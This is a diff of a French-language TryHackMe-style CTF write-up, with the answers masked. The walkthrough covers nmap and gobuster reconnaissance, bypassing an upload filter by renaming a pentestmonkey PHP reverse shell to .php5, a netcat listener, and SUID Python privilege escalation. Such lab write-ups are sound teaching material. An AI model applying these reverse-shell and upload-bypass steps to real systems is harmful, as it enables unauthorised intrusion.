@@ -39,7 +39,7 @@ J'ai regroupé les trois premières questions car nous pouvons y répondre avec 
 <br>En cherchant dans le manuel de la commande `nmap`, on voit que l'option `-sV` permet de scanner les ports ouverts et d'afficher les informations relatives aux services ainsi comme leur version:
 
 ```bash
-nmap -sV VOTRE_IP
+nmap -sV IP_VPN
 ```
 
 > [!WARNING]
@@ -47,7 +47,7 @@ nmap -sV VOTRE_IP
 
 <pre>
 Starting Nmap 7.60 ( https://nmap.org ) at 2024-08-29 17:40 BST
-Nmap scan report for ip-10-10-201-117.eu-west-1.compute.internal (VOTRE_IP)
+Nmap scan report for ip-10-10-201-117.eu-west-1.compute.internal (IP_VPN)
 Host is up (0.00044s latency).
 Not shown: 998 closed ports
 PORT   STATE SERVICE VERSION
@@ -64,7 +64,6 @@ Nmap done: 1 IP address (1 host up) scanned in 8.87 seconds
 <br>Réponse 2: <b>x.x.xx</b>
 <br>Réponse: <b>xxx</b>
 
-<br>
 
 ### Question 4
 <pre>
@@ -72,23 +71,22 @@ What is the hidden directory?
 Quel est le repertoire caché?
 </pre>
 
-Pour répondre à cette question, utilisez l'astuce qui ne nécessite pas de réponse:
+<br>Pour répondre à cette question, utilisez l'astuce qui ne nécessite pas de réponse:
 
 > [!TIP]
-> gobuster dir -u MACHINE_IP -w WORDLIST_PATH
+> gobuster dir -u IP_VPN -w WORDLIST_PATH
 
-Remplacez `MACHINE_IP` par l'IP de votre machine virtuelle et `WORDLIST_PATH` par le chemin de l'un des wordlists, qui, pour Gobuster, se trouvent dans: `/usr/share/wordlists/dirbuster/`:
+Remplacez `IP_VPN` par l'IP de votre machine distante et `WORDLIST_PATH` par le chemin de l'un des wordlists, qui, pour Gobuster, se trouvent dans: `/usr/share/wordlists/dirbuster/`:
 
 ```bash
-gobuster dir -u VOTRE_IP -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
+gobuster dir -u IP_VPN -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
 ```
-
 <pre>
 ===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
-[+] Url:            http://VOTRE_IP
+[+] Url:            http://IP_VPN
 [+] Threads:        10
 [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-1.0.txt
 [+] Status codes:   200,204,301,302,307,401,403
@@ -106,9 +104,8 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
 </pre>
 
-<br>Réponse: <b>/xxxxx/</b>
+Réponse: <b>/xxxxx/</b>
 
-<br>
 
 ## TACHE 3 - Getting a Shell
 <pre>
@@ -118,12 +115,12 @@ Trouvez un formulaire pour télécharger et obtenir un shell inversé et trouvez
 
 > [!TIP]
 > Search for "file upload bypass" and "PHP reverse shell".
-> <br>Recherchez « file upload bypass » et « PHP reverse shell ».
+> <br>Recherchez "file upload bypass" et "PHP reverse shell".
 
-<br>Commencez par ouvrir Firefox sur la machine distante et rentrez son IP:
+<br>Commencez par ouvrir Firefox sur la machine distante et rentrez l'IP du VPN:
 
 <pre>
-http://VOTRE_IP
+http://IP_VPN
 </pre>
 
 <br>Vous verrez une page d'accueil avec simplement écrit: 
@@ -165,10 +162,10 @@ Can you root me?
 
 Bon, je n'ai jamais dit que c'était toujours intéressant mais c'est un réflexe à avoir systématiquement.
 
-<br>Rendons-nous dans le dossier caché que nous avons découvert avec Gobuster toute à l'heure:
+Rendons-nous dans le dossier caché que nous avons découvert avec Gobuster toute à l'heure:
 
 <pre>
-http://VOTRE_IP/dossier_caché
+http://IP_VPN/dossier_caché
 </pre>
 
 <br>Ah, tiens, un formulaire de téléchargement ! Comme conseillé dans l'astuce:
@@ -180,7 +177,8 @@ Upload
 </pre>
 
 Nous allons donc pouvoir uploader un script, plus précisément, un payload de `reverse shell en php` puisque c'est une des contraintes de l'astuce.
-<br>Après quelques recherches, il semble qu'il y en ait un qui soit souvent utilisé, celui de [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell).
+
+Après quelques recherches, il semble qu'il y en ait un qui soit souvent utilisé, celui de [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell).
 
 Rendez-vous dans le dossier de téléchargement de la machine distante et téléchargez le:
 
@@ -197,11 +195,10 @@ git clone https://github.com/pentestmonkey/php-reverse-shell.git
 cd php-reverse-shell
 ```
 
-<br>Il va falloir modifier deux lignes: IP et PORT du fichier `php-reverse-shell.php`, éditez-le avec nano et cherchez les lignes:
+<br>Il va falloir modifier deux lignes: `IP` et `PORT` du fichier `php-reverse-shell.php`, éditez-le avec nano ou vim et cherchez les lignes:
 
 <pre>
 [...]
-
 set_time_limit (0);
 $VERSION = "1.0";
 <b>$ip = '&lt;IP_ATTACKBOX&gt;';  // CHANGE THIS
@@ -212,7 +209,6 @@ $error_a = null;
 $shell = 'uname -a; w; id; /bin/sh -i';
 $daemon = 0;
 $debug = 0;
-
 [...]
 </pre>
 
@@ -226,7 +222,7 @@ $debug = 0;
 chmod +x php-reverse-shell.php
 ```
 
-Vous pouvez uploader le payload... BIM ! Une erreur !
+<br>Vous pouvez uploader le payload... BIM ! Une erreur !
 <pre>
 PHP não é permitido!
 PHP n'est pas autorisé !
@@ -235,7 +231,7 @@ PHP n'est pas autorisé !
 Les extensions `.php` ne sont pas autorisées au téléchargement, voyez-vous ça...
 <br>Aucun problème, nous allons contourner le système en modifiant l'extension du fichier.
 
-Essayons avec l'estention `.php5`:
+Essayons avec l'extention `.php5`:
 
 ```bash
 mv php-reverse-shell.php php-reverse-shell.php5
@@ -245,10 +241,10 @@ O arquivo foi upado com sucesso!
 Le fichier a été téléchargé avec succès !
 </pre>
 
-<br>Pour vérifier que votre fichier a bien été télécharger, rendez-vous dans le dossier `/uploads` que nous avons vu quand nous avons lancer `Gobuster` au début de l'exercice.
+<br>Pour vérifier que votre fichier a bien été téléchargé, rendez-vous dans le dossier `/uploads` que nous avons vu quand nous avons lancé `Gobuster` au début de l'exercice.
 
 <pre>
-http://VOTRE_IP/uploads/
+http://IP_VPN/uploads/
 </pre>
 
 <pre>
@@ -259,10 +255,10 @@ Index of /uploads
 
 [ ]	php-reverse-shell.php5	2024-08-29 16:35 	5.4K	 
 
-Apache/2.4.29 (Ubuntu) Server at 10.10.201.117 Port 80
+Apache/2.4.29 (Ubuntu) Server at IP_VPN Port 80
 </pre>
 
-<br>Nous voyons qu'il est bien présent, c'est parfait.
+Nous voyons qu'il est bien présent, c'est parfait.
 
 Maintenant que le payload est chargé, retournez dans le Terminal et tapez la commande `netcat` pour entrer dans le `reverse shell`:
 
@@ -270,7 +266,7 @@ Maintenant que le payload est chargé, retournez dans le Terminal et tapez la co
 nc -lvnp <VOTRE_PORT>
 ```
 
-Cliquez sur le script pour l'exécuter, vous aurez accès au `reverse shell`:
+<br>Cliquez sur le script dans firefox pour l'exécuter, vous aurez accès au `reverse shell`:
 
 <pre>
 Listening on [0.0.0.0] (family 0, port 1234)
@@ -282,7 +278,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 /bin/sh: 0: can't access tty; job control turned off
 </pre>
 
-<br>C'est bien, mais il n'est pas stable nous allons donc le stabiliser avec un petit script en `Python`.
+<br>C'est bien, mais il n'est pas stable. Nous allons donc le stabiliser avec un petit script en `Python`.
 <br>
 
 ```python
@@ -300,7 +296,7 @@ find / -type f -name "user.txt" 2>/dev/null
 
 > [!NOTE]
 > On lui demande de:
-> - `find`: trouver
+> - `find`: Trouver
 > - `/` : A partir de la racine du système (puisque nous ne savons pas où est le fichier, on prend le plus large possible)
 > - `-type f`: Uniquement dans les fichiers
 > - `-name "user.txt"`: Celui portant le nom de "user.txt"
@@ -313,7 +309,8 @@ find / -type f -name "user.txt" 2>/dev/null
 </pre>
 
 <br>Parfait, il ne nous affiche qu'une ligne. Essayez la commande sans la suppression d'erreurs, vous verrez que c'est tout de suite plus lourd à lire.
-<br>Lisez le fichier avec `cat` par exemple:
+
+Lisez le fichier avec `cat` par exemple:
 
 ```bash
 cat /var/www/user.txt
@@ -322,8 +319,6 @@ cat /var/www/user.txt
 <pre>
 <b>THM{xxxxxxxxxxxxxxx}</b>
 </pre>
-
-<br>
 
 ## TACHE 4 - Privilege escalation
 <pre>
@@ -337,10 +332,10 @@ Search for files with SUID permission, which file is weird?
 Recherche de fichiers avec l'autorisation SUID, quel est le fichier bizarre ?
 </pre>
 
-<br>
-
 > [!TIP]
 > find / -user root -perm /4000
+
+<br>
 
 Utilisons la commande fournie dans l'indice, mais avec la suppression des erreurs pour les même raisons que précédemment: `2>/dev/null`:
 
@@ -348,7 +343,7 @@ Utilisons la commande fournie dans l'indice, mais avec la suppression des erreur
 find / -user root -perm /4000 2>/dev/null
 ```
 
-Pour des raisons pédagogiques et de manière <b>TRÈS EXCEPTIONNELLE</b>, je vais donner la réponse pour pouvoir expliquer pourquoi ce fichier est bizarre alors qu'il est toutà fait normal puisque c'est grâce à lui que nous pouvons exécuter les commandes `Python`:
+<br>Pour des raisons pédagogiques et de manière <b>TRÈS EXCEPTIONNELLE</b>, je vais donner la réponse pour pouvoir expliquer pourquoi ce fichier est bizarre alors qu'il est tout à fait normal puisque c'est grâce à lui que nous pouvons exécuter les commandes `Python`:
 
 <pre>
 [...]
@@ -366,18 +361,32 @@ Pour des raisons pédagogiques et de manière <b>TRÈS EXCEPTIONNELLE</b>, je va
 [...]
 </pre>
 
-<br>Le fait que `Python` se trouve dans la liste des permissions `sudo` implique qu'il a plus de permissions qu'il ne devrait.
-<br>En effet, tous les autres binaires ne peuvent être utilisés que par `sudo` alors que `Python` peut être utiliser par les utillisateurs classiques, il n'a pas besoin de ces permissions.
-<br>C'est donc par lui que nous allons passer élever nos privilèges.
+<pre>
+<b>/usr/bin/python</b>
+</pre>
 
-Pourquoi escalader nos privilèges ? Tout simplement parce qu'en l'état, il ne nous est pas possible d'accéder au dossier `/root`, qui contient, logiquement, le flag `root.txt`
+> [!NOTE]
+> Le fait que `Python` se trouve dans la liste des permissions `sudo` implique qu'il a plus de permissions qu'il ne devrait.
+> <br>En effet, tous les autres binaires ne peuvent être utilisés que par `sudo` alors que `Python` peut être utiliser par les utillisateurs classiques, il n'a pas besoin de ces permissions.
+> <br>C'est donc par lui que nous allons passer élever nos privilèges.
+
+### Question 2
+<pre>
+root.txt
+</pre>
+
+> [!TIP]
+> Search for gtfobins
+> Recherche de gtfobins
+
+<br>Pourquoi escalader nos privilèges ? Tout simplement parce qu'en l'état, il ne nous est pas possible d'accéder au dossier `/root`, qui contient, logiquement, le flag `root.txt`
 
 <pre>
 cd root
 bash: cd: root: Permission denied
 </pre>
 
-Pour savoir comment escalader nos privilèges pour accéder à ce dossier, il falloir aller consulter le site `GTFOBins` qui référencie tous les binaires Unix qui peuvent être utilisés pour contourner les restrictions de sécurité locales dans des systèmes mal configurés.
+<br>Pour savoir comment escalader nos privilèges pour accéder à ce dossier, il falloir aller consulter le site `GTFOBins` qui référencie tous les binaires Unix qui peuvent être utilisés pour contourner les restrictions de sécurité locales dans des systèmes mal configurés.
 
 Dans la barre de recherche, tapez `python` puis, séléctionnez `SUID`, puisque c'est l'autorisation qu'il nous faut (voir l'indice).
 
